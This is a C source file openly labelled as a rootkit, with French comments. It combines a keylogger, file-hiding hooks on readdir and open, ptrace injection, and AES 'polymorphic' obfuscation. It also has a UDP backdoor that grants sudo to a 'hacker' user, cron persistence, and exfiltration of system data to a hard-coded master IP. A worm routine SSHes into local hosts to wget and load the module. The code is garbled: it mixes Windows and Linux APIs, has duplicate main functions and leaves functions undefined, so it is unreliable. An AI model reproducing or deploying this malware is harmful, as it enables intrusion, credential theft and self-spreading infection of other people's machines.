#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <stdio.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdio.h>
#include <linux.h>
#include <time.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("F-society");
MODULE_DESCRIPTION("Rootkit");

// IP de la machine de contrôle (TON PC)
#define MASTER_IP "86.212.112.142"
#define MASTER_PORT 4445

#define MAX_KEY_NAME_LENGTH 128

// Fonction pour obtenir le nom de la machine
void get_machine_name(char *buffer, size_t size) {
    DWORD buffer_size = size;
    GetComputerNameA(buffer, &buffer_size);
}

// Fonction pour enregistrer la touche frappée
void log_key(const char *key) {
    FILE *file = fopen(key, "a");
    if (file != NULL) {
        fprintf(file, "%s", key);  // On écrit la touche dans le fichier
        fclose(file);
    }
}

// Fonction pour obtenir le nom de la touche
const char* get_key_name(int key) {
    static char key_name[MAX_KEY_NAME_LENGTH];
    
    // Gérer les touches spéciales
    if (key == VK_RETURN) {
        return "[ENTER]";
    } else if (key == VK_BACK) {
        return "[BACKSPACE]";
    } else if (key == VK_TAB) {
        return "[TAB]";
    } else if (key == VK_SPACE) {
        return "[SPACE]";
    } else if (key == VK_SHIFT) {
        return "[SHIFT]";
    } else if (key == VK_CONTROL) {
        return "[CTRL]";
    } else if (key == VK_MENU) {
        return "[ALT]";
    } else if (key == VK_CAPITAL) {
        return "[CAPS LOCK]";
    } else if (key == VK_ESCAPE) {
        return "[ESC]";
    }
    
    // Gérer les lettres et les chiffres
    if (key >= '0' && key <= '9') {
        snprintf(key_name, MAX_KEY_NAME_LENGTH, "%c", key);
        return key_name;
    } else if (key >= 'A' && key <= 'Z') {
        snprintf(key_name, MAX_KEY_NAME_LENGTH, "%c", key);
        return key_name;
    } else if (key >= 32 && key <= 126) {  // Autres symboles imprimables
        snprintf(key_name, MAX_KEY_NAME_LENGTH, "%c", key);
        return key_name;
    }

    // Pour d'autres touches non imprimables ou spéciales, on peut ajouter des noms
    return "[UNKNOWN]";
}

int main() {
    char machine_name[MAX_KEY_NAME_LENGTH];
    get_machine_name(machine_name, sizeof(machine_name));

    // Crée un fichier avec le nom de la machine
    char log_filename[MAX_KEY_NAME_LENGTH + 4];  // +4 pour ".txt"
    snprintf(log_filename, sizeof(log_filename), "%s.txt", machine_name);

    FILE *file = fopen(log_filename, "w");
    if (file != NULL) {
        fclose(file); // Crée ou vide le fichier au démarrage
    }

    printf("Keylogger is running on machine: %s\n", machine_name);

    // Boucle pour capturer les frappes clavier
    while (1) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {  // Si la touche est pressée
                const char *key_str = get_key_name(key);
                log_key(key_str);  // Enregistre la touche frappée dans le fichier
            }
        }
        Sleep(10);  // Petite pause pour ne pas surcharger la CPU
    }

    return 0;
}


// Fonction pour effectuer un cryptage AES avec une clé plus longue (AES-256)
void aes_encrypt(const unsigned char *input, unsigned char *output, const unsigned char *key) {
    AES_KEY encryptKey;
    AES_set_encrypt_key(key, 256, &encryptKey);  // Clé de 256 bits pour AES
    AES_encrypt(input, output, &encryptKey);
}

// Fonction pour effectuer un décryptage AES avec une clé plus longue (AES-256)
void aes_decrypt(const unsigned char *input, unsigned char *output, const unsigned char *key) {
    AES_KEY decryptKey;
    AES_set_decrypt_key(key, 256, &decryptKey);  // Clé de 256 bits pour AES
    AES_decrypt(input, output, &decryptKey);
}

// Fonction pour crypter dynamiquement le fichier rootkit
void encrypt_rootkit(const unsigned char *filename, const unsigned char *key) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Erreur d'ouverture de fichier");
        return;
    }

    // Lire le contenu du fichier dans un tampon
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    unsigned char *buffer = (unsigned char *)malloc(file_size);
    fread(buffer, 1, file_size, file);
    fclose(file);

    // Crypter le contenu du fichier
    unsigned char encrypted_data[file_size];
    aes_encrypt(buffer, encrypted_data, key);

    // Sauvegarder le fichier crypté
    file = fopen("rootkit_encrypted.bin", "wb");
    fwrite(encrypted_data, 1, file_size, file);
    fclose(file);

    free(buffer);
    printf("Fichier rootkit crypté et sauvegardé sous 'rootkit_encrypted.bin'\n");
}

// Fonction pour décrypter le fichier rootkit crypté
void decrypt_rootkit(const unsigned char *key) {
    FILE *file = fopen("rootkit_encrypted.bin", "rb");
    if (!file) {
        perror("Erreur d'ouverture du fichier crypté");
        return;
    }

    // Lire le contenu crypté du fichier
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    unsigned char *encrypted_data = (unsigned char *)malloc(file_size);
    fread(encrypted_data, 1, file_size, file);
    fclose(file);

    // Décrypter le contenu
    unsigned char decrypted_data[file_size];
    aes_decrypt(encrypted_data, decrypted_data, key);

    // Sauvegarder le fichier décrypté
    file = fopen("rootkit_decrypted.c", "wb");
    fwrite(decrypted_data, 1, file_size, file);
    fclose(file);

    free(encrypted_data);
    printf("Fichier rootkit décrypté et sauvegardé sous 'rootkit_decrypted.c'\n");
}

// Hooking pour masquer les fichiers et processus rootkit
static struct dirent* (*real_readdir)(DIR*) = NULL;

struct dirent* readdir(DIR* dirp) {
    if (!real_readdir) {
        real_readdir = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent* entry = real_readdir(dirp);
    if (entry == NULL) {
        return NULL;
    }

    // Masquer les fichiers rootkit et processus
    if (strcmp(entry->d_name, "rootkit_process") == 0 || 
        strstr(entry->d_name, "rootkit")) {
        return readdir(dirp);  // Passer l'entrée
    }

    return entry;
}

// Hooking pour masquer l'accès aux fichiers rootkit
static int (*real_open)(const char*, int, mode_t) = NULL;

int open(const char *pathname, int flags, mode_t mode) {
    if (!real_open) {
        real_open = (int (*)(const char*, int, mode_t))dlsym(RTLD_NEXT, "open");
    }

    // Masquer les fichiers rootkit
    if (strstr(pathname, "rootkit_encrypted.bin") || strstr(pathname, "rootkit_decrypted.c")) {
        return -1;  // Bloquer l'accès à ces fichiers
    }

    return real_open(pathname, flags, mode);  // Appel original si ce n'est pas le fichier ciblé
}

// Injection de code dans un processus légitime
void inject_code(pid_t pid) {
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);  // Attacher ptrace au processus cible
    waitpid(pid, NULL, 0);  // Attendre que le processus cible soit attaché

    // Injecter du code ici (par exemple modifier la mémoire du processus)
    printf("Injection de code dans le processus %d...\n", pid);
    
    // Détacher ptrace après l'injection
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

// Fonction pour appliquer des changements polymorphes
void polymorphic_change(unsigned char *code, size_t size) {
    // Appliquer des changements aléatoires pour modifier l'apparence du code
    for (size_t i = 0; i < size; i++) {
        code[i] ^= rand();  // XOR avec des valeurs aléatoires pour changer le code
    }
}

int main(int argc, char *argv[]) {
    unsigned char key[32] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 
                              0xab, 0xf7, 0x97, 0x75, 0x46, 0x01, 0x23, 0x02,
                              0x73, 0x15, 0x9f, 0x54, 0x56, 0x1f, 0x7a, 0x65, 
                              0x7d, 0x59, 0xa1, 0xb8, 0x0e, 0x6f, 0x99, 0xb7 };  // Clé AES-256

    // Exemple de cryptage du fichier rootkit
    encrypt_rootkit("rootkit.c", key);  // Crypter le fichier "rootkit.c" et le sauvegarder comme "rootkit_encrypted.bin"

    // Appliquer un changement polymorphe pour rendre le fichier encore plus difficile à détecter
    polymorphic_change((unsigned char *)"rootkit_encrypted.bin", strlen("rootkit_encrypted.bin"));

    // Exemple de décryptage du fichier rootkit
    decrypt_rootkit(key);  // Décrypter "rootkit_encrypted.bin" et le sauvegarder sous "rootkit_decrypted.c"

    // Exemple de processus et fichiers à masquer (hooking)
    DIR *dir = opendir("/proc");
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            printf("Processus trouvé : %s\n", entry->d_name);
        }
        closedir(dir);
    }

    // Exemple de hooking de la fonction open pour masquer des fichiers
    if (open("rootkit_encrypted.bin", O_RDONLY, 0) == -1) {
        printf("Accès à 'rootkit_encrypted.bin' bloqué avec succès !\n");
    }

    // Exemple d'injection de code dans un autre processus
    pid_t target_pid = 1234;  // Remplacer avec un PID valide pour les tests
    inject_code(target_pid);  // Injecter du code dans le processus cible

    return 0;
}


// Backdoor furtif : écoute un port UDP secret pour recevoir des commandes
static int backdoor(void *data) {
    struct socket *sock;
    struct sockaddr_in addr;
    char buffer[128];
    int ret;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(5555); // Port caché

    sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
    kernel_bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    while (true) {
        struct sockaddr_in client;
        int len = sizeof(client);
        ret = kernel_recvmsg(sock, (struct msghdr *) &client, buffer, sizeof(buffer), 0, 0);
        
        if (ret > 0) {
            buffer[ret] = 0;

            if (strcmp(buffer, "shutdown") == 0) {
                call_usermodehelper("/sbin/shutdown", (char *[]) { "/sbin/shutdown", "-h", "now", NULL }, NULL, UMH_WAIT_EXEC);
            } else if (strcmp(buffer, "reboot") == 0) {
                call_usermodehelper("/sbin/reboot", (char *[]) { "/sbin/reboot", NULL }, NULL, UMH_WAIT_EXEC);
            } else if (strcmp(buffer, "root") == 0) {
                call_usermodehelper("/bin/bash", (char *[]) { "/bin/bash", "-c", "echo 'hacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", NULL }, NULL, UMH_WAIT_EXEC);
            }
        }
    }
    return 0;
}

// Auto-reload après reboot (cronjob)
static int add_persistence(void) {
    struct file *file;
    mm_segment_t old_fs = get_fs();
    set_fs(KERNEL_DS);

    file = filp_open("/etc/cron.d/rootkit_persist", O_WRONLY | O_CREAT, 0644);
    if (!IS_ERR(file)) {
        char *cronjob = "@reboot root insmod /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko\n";
        vfs_write(file, cronjob, strlen(cronjob), &file->f_pos);
        filp_close(file, NULL);
    }

    set_fs(old_fs);
    return 0;
}

// Fonction pour récupérer des infos système
static void get_system_info(char *buffer) {
    struct file *file;
    mm_segment_t old_fs = get_fs();
    set_fs(KERNEL_DS);

    // Exécute la commande et stocke le résultat dans /tmp/sysinfo
    call_usermodehelper("/bin/bash", (char *[]) { "/bin/bash", "-c",
        "echo 'HOSTNAME:'$(hostname) > /tmp/sysinfo && "
        "echo 'USER:'$(whoami) >> /tmp/sysinfo && "
        "echo 'OS:'$(cat /etc/os-release | grep PRETTY_NAME) >> /tmp/sysinfo && "
        "echo 'IP:'$(hostname -I) >> /tmp/sysinfo && "
        "echo 'PROCESS:'$(ps aux) >> /tmp/sysinfo", NULL }, NULL, UMH_WAIT_EXEC);

    // Lecture du fichier
    file = filp_open("/tmp/sysinfo", O_RDONLY, 0);
    if (!IS_ERR(file)) {
        vfs_read(file, buffer, 4096, &file->f_pos);
        filp_close(file, NULL);
    }

    set_fs(old_fs);
}

// Envoie les données au serveur maître
static int send_data(void *data) {
    struct socket *sock;
    struct sockaddr_in addr;
    char buffer[4096];

    get_system_info(buffer);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = in_aton(MASTER_IP);
    addr.sin_port = htons(MASTER_PORT);

    sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (sock) {
        if (kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0) == 0) {
            kernel_sendmsg(sock, NULL, buffer, strlen(buffer), 0);
        }
        sock_release(sock);
    }
    return 0;
}

// Scan du réseau local et infection automatique via SSH
static int scan_network(void *data) {
    struct file *file;
    mm_segment_t old_fs = get_fs();
    set_fs(KERNEL_DS);

    // Scan du réseau avec nmap et tentative de connexion SSH
    call_usermodehelper("/bin/bash", (char *[]) { "/bin/bash", "-c",
        "nmap -p 22 --open -oG - 192.168.1.* | awk '/22\\/open/ {print $2}' > /tmp/targets && "
        "for ip in $(cat /tmp/targets); do "
        "   ssh -o StrictHostKeyChecking=no -o BatchMode=yes root@$ip 'wget http://" MASTER_IP "/rootkit.ko -O /tmp/rootkit.ko && insmod /tmp/rootkit.ko' & "
        "done", NULL }, NULL, UMH_WAIT_EXEC);

    set_fs(old_fs);
    return 0;
}

// Init du rootkit
static int __init rootkit_init(void) {
    printk(KERN_INFO "[+] Rootkit chargé\n");

    // Lancement de l'exfiltration et infection
    kthread_run(send_data, NULL, "exfiltration_thread");
    kthread_run(scan_network, NULL, "network_scan_thread");

    return 0;
}

    // Cache le module
    hide_module();

    // Keylogger furtif
    nb.notifier_call = keylogger_handler;
    register_keyboard_notifier(&nb);

    // Ajoute persistance
    add_persistence();

    // Lancement backdoor
    kthread_run(backdoor, NULL, "backdoor_thread");

    return 0;
}